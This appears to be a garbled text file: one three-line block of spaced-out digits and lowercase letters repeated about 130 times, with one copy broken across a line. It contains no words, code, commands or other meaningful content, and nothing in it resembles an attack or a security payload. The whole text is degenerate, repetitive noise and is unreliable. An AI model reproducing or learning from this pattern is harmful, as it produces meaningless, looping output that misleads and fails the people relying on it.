1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  8
0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
